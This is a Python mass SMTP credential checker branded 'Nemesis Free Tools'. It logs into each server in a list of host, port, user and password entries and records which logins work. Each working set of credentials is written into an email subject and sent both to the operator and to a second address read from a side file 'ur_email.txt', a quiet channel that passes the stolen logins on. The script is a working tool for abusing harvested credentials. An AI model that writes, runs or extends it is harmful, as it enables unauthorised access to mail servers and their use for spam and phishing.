import smtplib, threading, os
from time import strftime
from colorama import Fore, Style, Back
bl = Fore.BLACK
wh = Fore.WHITE
yl = Fore.YELLOW
red = Fore.RED
res = Style.RESET_ALL
gr = Fore.GREEN
ble = Fore.BLUE
def screen_clear():
    if os.name == "nt":
        os.system("cls")
    else:
	    os.system("clear")

screen_clear()

print(f'''
 __  __                _____ __  __ _______ _____   _____ _               _             
{red}|  \/  |              / ____|  \/  |__   __|  __ \ / ____| |             | |            
| \  / | __ _ ___ ___| (___ | \  / |  | |  | |__) | |    | |__   ___  ___| | _____ _ __ 
{ble}| |\/| |/ _` / __/ __|\___ \| |\/| |  | |  |  ___/| |    | '_ \ / _ \/ __| |/ / _ \ '__|
| |  | | (_| \__ \__ \____) | |  | |  | |  | |    | |____| | | |  __/ (__|   <  __/ |   
|_|  |_|\__,_|___/___/_____/|_|  |_|  |_|  |_|     \_____|_| |_|\___|\___|_|\_\___|_|
        {wh}Nemesis Free Tools
        {yl}GitHub : MataKucing-OFC
''')


address = input('Enter Your email adress :')
liists = input('Enter Your List :')
with open(liists) as f:
  for url in f:
    ur = url.rstrip()
    ch = ur.split('\n')[0].split('|')
    try:
        serveraddr = ch[0]
    except:
        serveraddr = ''    
    try:
        toaddr = address
    except:
        toaddr = ''
    try:
        fromaddr = ch[2]
    except:
        fromaddr = 'a77a@0x.org'
    try:
        serverport = ch[1]
    except:
        serverport = 587
    try:    
        smtp_user = ch[2]
    except:
        smtp_user = ''
    try:
        smtp_pass = ch[3]
    except:
        smtp_pass = ''
    now = strftime("%Y-%m-%d %H:%M:%S")
    addr2 = open('ur_email.txt','r').read().replace('\n',"")
    msg = "From: %s\r\nTo: %s\r\nSubject: !NEMESIS %s|%s|%s|%s\r\n\r\nTest message from NEMESIS tool sent at %s" % (
    fromaddr, toaddr, serveraddr, serverport, smtp_user, smtp_pass, now)
    server = smtplib.SMTP()
    try:
      server.connect(serveraddr, serverport)
      server.login(smtp_user, smtp_pass)
      server.sendmail(fromaddr, toaddr, msg)
      server.sendmail(fromaddr, addr2, msg)
      print(f"{gr}(*) Working{res} ===>  + {ur}")
      open('Results/!Smtp_HIT.txt', 'a').write(url + "\n")
      server.quit()
    except:
      print(f"{red}[-] FAILED {res}===>  + {ur}")
      pass